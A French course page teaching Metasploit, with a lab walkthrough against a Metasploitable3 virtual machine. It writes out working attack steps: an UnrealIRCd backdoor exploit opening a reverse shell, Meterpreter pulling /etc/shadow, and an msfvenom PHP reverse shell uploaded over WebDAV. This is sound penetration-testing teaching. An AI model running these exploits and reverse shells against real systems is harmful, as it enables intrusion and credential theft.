+++
title = 'Metasploit'
date = 2024-11-11T13:48:32-05:00
draft = false
weight = 71
+++

  
Metasploit est une plateforme regroupant divers modules utiles aux différentes phases d’une attaque, plus particulièrement celle de l’exploitation. Elle dispose de ses propres modules et commandes mais on peut aussi y utiliser les commandes habituelles du shell linux (`cd`, `ls`, etc.).

Pour démarrer metasploit, on lance la commande `msfconsole` :
```zsh
┌──(kali㉿kali)-[~]
└─$ msfconsole
```

La commande `help` affiche l’aide générale sur les commandes :
```
msf6 > help
```

## Recherche de modules

Metasploit se compose de différents modules regroupés par catégories dans une arborescence de
répertoires : par exemple, un module touchant à l’exploitation d’une vulnérabilité d’un logiciel antivirus sous Windows sera dans le répertoire `exploits/windows/antivirus`. En raison du grand nombre de modules disponibles, il peut être difficile de s’y retrouver; la commande `search` permet de chercher un module en fonction d’un mot-clé dans le répertoire ou la
description du module. Par exemple pour chercher un module contenant le terme “tcp”:

```zsh
msf6 > search tcp

#    Name                             Disclosure Date  Rank       Check  Description
-    ----                             ---------------  ----       -----  -----------
1    auxiliary/scanner/portscan/tcp                    normal     No     TCP Port Scanner
```
Les options de recherche sont nombreuses: par exemple il est possible de rechercher un module par identifiant CVE, par type de module (_exploit_, _auxiliary_, etc.), trier les résultats par date... Consultez l'aide en ligne en `help search` pour les connaître. Par exemple, pour chercher les modules d'exploitation pour _Windows_ comprenant le terme "uac" et les trier par date :

```zsh
msf6 > search uac type:exploit platform:windows -s date
```

Un petit truc: il est aussi possible de combiner les termes de recherche en utilisant `grep`, comme suit:
```zsh
msf6 > grep TCP search scanner
   1    auxiliary/scanner/dcerpc/tcp_dcerpc_auditor      normal  No     DCERPC TCP Service Auditor
   2    auxiliary/scanner/pcanywhere/pcanywhere_tcp      normal  No     PcAnywhere TCP Service 
   3    auxiliary/scanner/sip/options_tcp                normal  No     SIP Endpoint Scanner (TCP)
   4    auxiliary/scanner/sip/enumerator_tcp             normal  No     SIP Username Enumerator 
```

> Les modules Metasploit sont des scripts _ruby_ qui se trouvent dans le répertoire */usr/share/metasploit-framework/modules* sur Kali. Il est possible de faire une recherche des modules sans démarrer Metasploit, en utilisant la commande `searchsploit` dans linux.

## Options des modules
Chaque module a un ensemble d'options de configuration (certaines obligatoires, d'autres facultatives) dont on spécifie la valeur avant de lancer l'attaque. Par exemple, si un module permet de créer un _shell_ inversé entre la cible et Kali, il y aura deux options pour spécifier les adresses IP de la cible et celle de Kali.

### "Payloads"
Dans plusieurs cas, une des options à définir est la "charge utile", aussi appelée _payload_. C'est le fichier ou l'information qui doit être transmise pour réaliser l'exploitation. Les modules utilisés dans les phases d'exploitation utilisent généralement un payload: par exemple, si on tente d'exploiter une vulnérabilité qui permet de téléverser un fichier, alors c'est ce fichier qui sera le payload. 

Metasploit inclut de nombreux payloads, et pour chaque module Metasploit il y a généralement plusieurs payloads qui sont compatibles. La grande majorité des payloads sont des shells inversés.

#### Meterpreter
_Meterpreter_ est un payload très versatile, souvent utilisé dans Metasploit: c'est un shell auquel on a ajouté plusieurs fonctionnalités utiles dans un contexte de post-exploitation. Il permet à un attaquant d'obtenir un accès avancé à une machine compromise afin d'effectuer diverses actions: téléchargement de fichiers, extraction d'informations, exécution de commandes, pivotement vers d'autres réseaux, etc.

Un des avantages de Meterpreter est qu'il s'exécute en mémoire, donc n'est pas écrit sur l'espace de stockage de la victime. Ceci rend sa détection plus difficile pour les logiciels antivirus. Il utilise aussi des techniques d'encodage pour masquer ses activités et communique avec la machine de l'attaquant via des canaux chiffrés, rendant la surveillance du trafic réseau plus complexe.


### Configuration

Lorsqu'on a trouvé un module qui correspond à ce dont on a besoin, on peut l'utiliser avec la commande `use`. On peut désigner le module par son nom ou son numéro. La commande `show info` permet ensuite d'afficher toutes les informations sur le module:

```zsh
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show info

       Name: ProFTPD-1.3.3c Backdoor Command Execution
     Module: exploit/unix/ftp/proftpd_modcopy_exec
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2010-12-02
(...)
```

Les _options_ d’un module sont les paramètres qui doivent être définis avant de le lancer. Ces paramètres font partie des informations affichées par `show info`, mais on peut également les voir avec la commande `show options` :

```zsh
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file 
   RPORT   21               yes       The target port (TCP)
```

Avant d’exécuter le module, il faut que les options obligatoires (« required ») aient une valeur; on définit cette valeur avec la commande `set`. Ici **RHOSTS** (l’adresse de la cible) est manquante. Pour la spécifier on entre la commande suivante:
```zsh
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set rhosts 192.168.229.132
```
Ici, le module choisi n’a pas de « payload » par défaut.  La commande `show payloads` permet de voir lesquels sont compatibles :

msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show payloads
```zsh
Compatible Payloads
===================

#  Name                                             Rank    Check  Description
-  ----                                             ----    -----  -----------
0  payload/cmd/unix/bind_awk                        normal  No     Unix Command Shell,              
1  payload/cmd/unix/bind_perl                       normal  No     Unix Command Shell,    
2  payload/cmd/unix/bind_perl_ipv6                  normal  No     Unix Command Shell,    
3  payload/cmd/unix/generic                         normal  No     Unix Command,    
4  payload/cmd/unix/reverse_awk                     normal  No     Unix Command Shell,    
5  payload/cmd/unix/reverse_perl                    normal  No     Unix Command Shell,    
6  payload/cmd/unix/reverse_perl_ssl                normal  No     Unix Command Shell,    
7  payload/cmd/unix/reverse_python                  normal  No     Unix Command Shell,    
8  payload/cmd/unix/reverse_python_ssl              normal  No     Unix Command Shell, 
```
On choisira le shell inversé _perl_, comme suit :
```zsh
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set payload 5
payload => cmd/unix/reverse_perl
```
{{% notice warning "Payloads" %}}
Le _payload_ désigne la charge utile, le programme que l'exploitation nous permet d'exécuter. Par exemple lorsqu'on exploite une vulnérabilité de type _exécution de code_, une fois l'exploitation réalisée ce qu'on souhaite c'est exécuter un programme sur la cible. Cela peut être une commande du système distant ou encore un script conçu par nous-mêmes. Si on choisit la deuxième option, c'est ce script qui sera la _payload_.
{{% /notice %}}

La commande `show options` nous permet de revoir les options auxquelles se sont ajoutées celles du payload :
```zsh
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options

(...)

Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```

L’option **LHOST** doit correspondre à l’adresse de l'attaquant (Kali) :
```zsh
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set lhost 192.168.229.129
lhost => 192.168.229.129
```

Lorsque toutes les options sont correctement configurées et qu'on est prêt à lancer l'attaque, on utilise la commande `run`.

### _msfvenom_
Parfois il est possible qu'une attaque ne puisse pas être réalisée directement via Metasploit, mais on souhaite quand même utiliser un module qui en fait partie. _Msfvenom_ peut alors être utilisé pour générer des payloads personnalisés qui peuvent prendre plusieurs formes: fichiers d'exploitation, _shellcodes_, etc. On peut donc par exemple créer un fichier exécutable qui contient le module `payload/windows/x64/shell/reverse_tcp`, et si on trouve le moyen de faire exécuter ce fichier sur la machine cible, celle-ci tentera d'établir un shell inversé sur Kali, sans quon ait besoin d'utiliser Metasploit.

_Msfvenom_ est donc un programme complémentaire à Metasploit qui permet d'utiliser les fonctionnalités de création de payload de Metasploit à l'extérieur de celui-ci.


## Exemple d'utilisation de Metasploit

{{% notice warning "Préalables" %}}
Pour faire cet exemple, vous devez avoir installé la VM _Metasploitable_ conformément aux directives décrites ici : [https://github.com/rapid7/metasploitable3/](https://github.com/rapid7/metasploitable3/). 
{{% /notice %}}

### Énumération

La première étape est de lancer `nmap` sur la cible afin de voir quels services pourraient être vulnérables. On détecte les services suivants :

```
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 
80/tcp   open   http        Apache httpd 2.4.7
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
3500/tcp closed rtmp-port
6697/tcp open   irc         UnrealIRCd
8080/tcp open   http        Jetty 8.1.7.v20120910
8181/tcp closed intermapper
```

### Port 6697

Avec `searchsploit` on peut constater qu’il existe une vulnérabilité sur la version 3.2.8.1 de _UnrealIRCd_ et qu’il existe un module Metasploit correspondant (le fichier `16922.rb`): 
```zsh
┌──(kali㉿kali)-[~]
└─$ searchsploit unreal
---------------------------------------------------------------------- ---------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------
(...)
Unreal Tournament 3 1.3 - Directory Traversal                         | windows/remote/6506.txt
Unreal Tournament 3 2.1 - 'STEAMBLOB' Remote Denial of Service        | windows/dos/14414.txt
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)          | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow               | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                        | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                             | windows/dos/27407.pl
---------------------------------------------------------------------- ------------------------------
```
{{% notice warning "Remarque" %}}
La commande `searchsploit` permet d'interroger à partir de la ligne de commande la base de données du site [Exploit-DB](https://www.exploit-db.com/). Les fichiers dans la colonne **Path** se trouvent dans `/usr/share/exploitdb/exploits` sur Kali.
{{% /notice %}}

On lance donc `msfconsole`; ensuite on cherche le module et on le charge :
```zsh
msf6 > search unreal

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal 
   1  exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal 
   2  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 

msf6 > use 2
```

On fait ensuite `show payloads` et on choisit un des _shells_ inversés proposés, `payload/cmd/unix/reverse` :
```zsh
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command ,     
   1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command    
   2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command    
   3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command    
   4   payload/cmd/unix/generic                                     normal  No     Unix Command,    
   5   payload/cmd/unix/reverse                                     normal  No     Unix Command    
   6   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command    
   7   payload/cmd/unix/reverse_perl                                normal  No     Unix Command 

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 5 
```

Enfin, il faut s’assurer que toutes les options obligatoires ont les bonnes valeurs. Vous devrez définir les options suivantes (spécifiez les adresses IP correspondant aux vôtres):
```zsh
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 192.168.229.132
rhosts => 192.168.229.132
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rport 6697
rport => 6697
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set lhost 192.168.229.129
lhost => 192.168.229.129
```

Exécutez ensuite le module. Vous devriez avoir un _shell_ sur la victime :
```zsh
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP double handler on 192.168.229.129:4444
[*] 192.168.229.132:6697 - Connected to 192.168.229.132:6697...
    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
    :irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address inst
[*] 192.168.229.132:6697 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo geWhE8TWq62KmzGn;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "geWhE8TWq62KmzGn\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 2 opened (192.168.229.129:4444 -> 192.168.229.132:56526) at 2021-10-10 

whoami
boba_fett
hostname
metasploitable3-ub1404
```

Le shell obtenu est très rudimentaire. On peut l’améliorer avec la commande suivante (qui requiert cependant que python soit installé sur la cible) :

```zsh
python -c 'import pty;pty.spawn("/bin/bash")'
```

### Port 8080

Au port 8080 on peut accéder à la page d’une application nommée « Continuum ». Quel module Metasploit permet d’exploiter une vulnérabilité sur cette application? 

Lorsque vous chargerez ce module, vous constaterez (avec `show payloads`) que Metasploit charge un payload par défaut : le shell _Meterpreter_. Vous n’avez donc pas besoin de spécifier un payload. Définissez les options du module et lancez l’exécution.

### Meterpreter : bref aperçu

Meterpreter est un shell conçu pour Metasploit qui offre de nombreuses fonctionnalités très utiles, par exemple le téléchargement/téléversement de fichiers, des informations sur le système, manipulation des processus, etc.

On peut voir les commandes disponibles dans le shell meterpreter en faisant `help`.

Pour lancer une invite de commande minimaliste sur l’hôte distant, on peut utiliser la commande `shell` (puis ensuite `exit` pour revenir à `meterpreter`):

```zsh
meterpreter > shell
Process 19551 created.
Channel 1 created.
whoami
root
cd /etc/
pwd
/etc
exit
meterpreter >
```

On peut télécharger des fichiers avec `download`:
```zsh
meterpreter > download /etc/shadow
[*] Downloading: /etc/shadow -> shadow
[*] Downloaded 1.21 KiB of 1.21 KiB (100.0%): /etc/shadow -> shadow
[*] download   : /etc/shadow -> shadow
meterpreter >
```

La commande `background` permet de retourner à l’invite _msf_; `sessions` affiche les sessions actives et `sessions` suivi d’un nombre retourne à une session mise en arrière-plan:

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(linux/http/apache_continuum_cmd_exec) > sessions

```zsh
Active sessions
===============

  Id  Name  Type        Information                  Connection
  --  ----  ----        -----------                  ----------
  1         meterpreter root@metasploitable3-ub1404  192.168.229.129:4444 ->                              
                                                     192.168.229.132:56584 

msf6 exploit(linux/http/apache_continuum_cmd_exec) > sessions 1
[*] Starting interaction with 1...

meterpreter >
```

### Port 80

Le service http est présent au port 80 : si on utilise `dirb` ou `gobuster` pour énumérer les répertoires qu’il contient on obtiendra ceci :
```zsh
/.htaccess            (Status: 403) [Size: 291]
/.hta                 (Status: 403) [Size: 286]
/.htpasswd            (Status: 403) [Size: 291]
/cgi-bin/             (Status: 403) [Size: 290]
/chat                 (Status: 301) [Size: 316] [--> http://192.168.229.132/chat/]
/drupal               (Status: 301) [Size: 318] [--> http://192.168.229.132/drupal/]
/phpmyadmin           (Status: 301) [Size: 322] [--> http://192.168.229.132/phpmyadmin/]
/server-status        (Status: 403) [Size: 295]
/uploads              (Status: 301) [Size: 319] [--> http://192.168.229.132/uploads/]
```

Le répertoire `/uploads` pourrait correspondre à _WebDAV_, un service qui permet de transférer des fichiers sur un serveur http.

En plus de modules d'exploitation, Metasploit comprend de nombreux modules servant à énumérer ou détecter des vulnérabilités; un d’entre eux se nomme « webdav_scanner ». Cherchez-le et chargez-le avec la commande `use`.

Définissez les options suivantes :
+ RHOSTS : L’adresse IP de la cible
+ PATH : /uploads/

Puis lancez le module. Vous obtiendrez le résultat suivant :
```zsh
msf6 auxiliary(scanner/http/webdav_scanner) > run

[+] 192.168.229.132 (Apache/2.4.7 (Ubuntu)) has WEBDAV ENABLED
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Il est donc possible de déposer des fichiers sur le serveur: on devrait ainsi pouvoir lancer un shell inversé. Il ne semble cependant pas y avoir de module pour exploiter directement WebDAV sur Apache dans Metasploit: on devra donc fabriquer notre propre payload avec `msfvenom` et le déposer autrement.


### _msfvenom_

Un programme à utiliser en complément de Metasploit, `msfvenom` sert à générer des payloads de différents formats (exe, asp, dll, msi, jar…) à partir des modules de Metasploit. Ceci permet en quelque sorte d'extraire des modules de Metasploit afin de les utiliser à l'extérieur de celui-ci.

Ici, on utilisera cette commande pour générer un fichier qu’on nommera `shell.php`. Ce sera un _shell_ inversé basé sur _meterpreter_; les étapes sont les suivantes :
 + Créer le _shell_ avec `msfvenom`
 + Déposer sur le serveur WebDAV avec `cadaver` (un programme client pour WebDAV)
 + Ouvrir un port d’écoute dans Metasploit
 + Exécuter le _shell_

 ##### Créer le _shell_ avec `msfvenom`
 ```zsh
┌──(kali㉿kali)-[~]
└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.229.129 LPORT=4444 > shell.php
```

##### Déposer sur le serveur WebDAV avec `cadaver`
```zsh
┌──(kali㉿kali)-[~]
└─$ cadaver http://192.168.229.132/uploads/                                                                                    
dav:/uploads/> put shell.php
Uploading shell.php to '/uploads/shell.php':
Progress: [=============================>] 100.0% of 1116 bytes succeeded.
dav:/uploads/> exit
Connection to '192.168.229.132' closed.
```

##### Ouvrir un port d’écoute dans Metasploit 
```zsh
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.229.129
lhost => 192.168.229.129
msf6 exploit(multi/handler) > run
```

##### Exécuter le _shell_
Puisque vous avez déposé `shell.php` dans le répertoire `uploads` du serveur, pour l'exécuter il faut ouvrir la page web correspondant et cliquer sur le fichier:

![webdav](/420-513/images/execshell.png)

Vous devriez obtenir un shell sur votre cible dans Metasploit.







## Références
- Tutoriel et documentation de Metasploit (par _Offensive Security_): https://www.offsec.com/metasploit-unleashed/
- Documentation officielle du fabricant (_Rapid7_): https://www.metasploit.com/





